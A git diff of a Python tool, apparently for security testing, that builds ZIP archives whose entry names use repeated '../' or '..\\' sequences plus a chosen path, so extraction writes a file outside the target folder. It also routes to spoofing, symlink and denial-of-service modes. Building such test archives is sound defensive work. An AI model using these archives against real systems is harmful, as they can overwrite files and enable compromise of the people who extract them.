@@ -10,51 +10,60 @@ from validators import InputValidator
 
 # `traversal_depth` function determines how many path traversal paths are traversed
 def get_traversal_depth():
+    depth = default_config["pt"]["traversal_depth"] or 1
     if default_mode:
-        depth = default_config["pt"]["traversal_depth"]
         if InputValidator.is_int(depth) == False:
-            raise SystemExit("Please check the default config file, seems to be an error under path traversal settings.\
-                Path traversal depth must be a positive integer")
+            print("[!] Please check the default config file, seems to be an error under path traversal settings.\n"
+                "    Path traversal depth must be a positive integer")
+            exit(1)
     else:
         while True:
-            depth = input("Enter number of path traversal steps (depth) you would like to test: ").strip()
-            print()
+            depth = input(f"[+] Enter number of path traversal occurrences (depth) you would like to test. (Press enter for default `{depth}`):").strip() or default_config["pt"]["traversal_depth"]
+            print(f"[i] Generating `{depth}` occurrences of Path Traversal sequence.\n")
             try:
                 depth = int(depth)
                 break
             except:
-                print("Invalid. Depth must be a positive Integer.")
+                print("Invalid. Depth must be a positive Integer.\n")
     
     return depth
 
-def get_file_name():
-    if default_mode:
-        file_name = default_config["pt"]["file_name"]
-    else:
-        while True:
-            file_name = input("Enter file to be saved as a malicious path traversal (e.g. `hello.txt`): ").strip()
-            print()
-            
-            if InputValidator.is_non_empty_string(file_name) == False:
-                print("File name can't be an empty string.")
-            else:
-                break
+def get_traversal_path(operating_system):
+    path = default_config["pt"]["path"][operating_system]
+    if default_mode == False:
+        path = input(f"[+] Enter a path in which you would like the file to be extracted to. (Press enter for default `{path}`):").strip() or path
+    
+    print(f"[i] Using `{path}` as the extraction location (in accordance with the Path Traversal depth chosen)\n")
         
+    return path
+
+def get_file_name():
+    file_name = default_config["pt"]["file_name"]
+    
+    if default_mode == False:
+        file_name = input(f"[+] Enter file name to be saved when extracting the ZIP. (Press enter for default `{file_name}`): ").strip() or file_name
+    
+    print(f"[i] Using `{file_name}` as file name.\n")
+    
     return file_name
 
-def create_path_traversal(path):
+def create_path_traversal():
+    tmp_file_name = "tmp_path_traversal"
+    
     traversal_depth = get_traversal_depth()
     
     if operating_system == "w":
         path_traversal_dir = ("..\\" * traversal_depth)
     else:
         path_traversal_dir = ("../" * traversal_depth)
-        
-    path_traversal_dir += path + get_file_name()
+    
+    traversal_path = get_traversal_path(operating_system)
+    
+    path_traversal_dir += traversal_path + get_file_name()
     
     # Get an existing ZIP file to copy and work on
     while True:
-        zip_location = input("[+] Enter an existing ZIP file location to work on (Enter to skip and create a new zip): ").strip()
+        zip_location = input("[+] Enter an existing ZIP file location to work on. (Press enter to create a new zip): ").strip()
         
         # If user gave a ZIP he would want to work on
         if zip_location:
@@ -80,18 +89,47 @@ def create_path_traversal(path):
             # Exit loop
             break
     
-    # TODO: Allow the user to choose a different file to contain path traversal (Only if the user gave a zip file)
-    with zipfile.ZipFile(zip_file, 'a') as zipf:
-        content = "If you see me, this might me a bad sign..."
-        temp_file = "tmp.txt"
-        with open(temp_file, "w") as f:
-            f.write(content)
+    # Get an existing file to push into the ZIP and change its name to include the Path Traversal
+    while True:
+        file_location = input("[+] Enter a file path you wish to take out this attack with - The file will be extracted using path traversal. (Press enter to create a new file): ").strip()
         
-        # Add them to the ZIP with custom names
-        zipf.write(temp_file, arcname=path_traversal_dir)
-        os.remove(temp_file)
+        # If user gave a File he would want to push into the ZIP
+        if file_location:
+            # Verify File location
+            if os.path.exists(file_location) and os.path.isfile(file_location):
+                # Create a copy of the File that the user gave
+                shutil.copy(file_location, tmp_file_name)
+                
+                print(f"[i] Using existing file '{file_location}'\n")
+                
+                # Exit loop
+                break
+            
+            # ZIP not found
+            else:
+                # Will start loop again and request valid zip location again
+                print("[!] Invalid location, zip not found.\n")
+        
+        # Create a new File
+        else:
+            file_content = "If you see me, this might me a bad sign..."
+            with open(tmp_file_name, "w") as f:
+                f.write(file_content)
+                
+            print(f"[i] Created a new file\n")
+            
+            # Exit loop
+            break
     
-    print(f"New ZIP file created named {zip_file} with `{path_traversal_dir}` as a malicious file.")
+    # TODO: Get a file from the user he would like to put inside the zip, if none is provided create a file
+    # Add File into the ZIP with its name containing Path Traversal to the ZIP with custom names
+    with zipfile.ZipFile(zip_file, 'a') as zipf:
+        zipf.write(tmp_file_name, arcname=path_traversal_dir)
+        
+        # Remove temp file
+        os.remove(tmp_file_name)
+    
+    print(f"New ZIP file created named `{zip_file}` with `{path_traversal_dir}` as a malicious file.")
 
 def create_spoofed_file(zip_file, filename):
     content = f"Is my name spoofed? If you are not vulnerable, I should have the following file name: {filename}"
@@ -262,13 +300,6 @@ def main():
             help="Specify the operating system: w (windows), l (linux), or u (unix). Default is linux"
         )
         
-        # Add the 'path' argument (optional)
-        parser.add_argument(
-            "-p", "--path",
-            default=default_config["pt"]["path"][default_config["operating_system"]],
-            help="Path to include in file name after traversal. e.g. `etc/`. For an empty path, add the argument with an empty double quote - \"\""
-        )
-        
         # Add the 'default' argument (optional, no data required)
         parser.add_argument(
             "-D", "--default",
@@ -291,7 +322,7 @@ def main():
         
         match args.type:
             case "pt":
-                create_path_traversal(args.path)
+                create_path_traversal()
             case "fns":
                 spoof_file_name()
             case "sym":
@@ -303,9 +334,10 @@ def main():
             case "dos":
                 print("Denial of Service selected")
             case _:
-                create_path_traversal(args.path)
+                print("[i] No action type specified, continuing with Path Traversal ZIP vulnerability.\n")
+                create_path_traversal()
     except KeyboardInterrupt:
-        print("\nOperation cancelled by the user. Exiting gracefully...")
+        print("\n\nOperation cancelled by the user. Exiting gracefully...")
         sys.exit(0)
 
 # TODO: Load default settings from config file
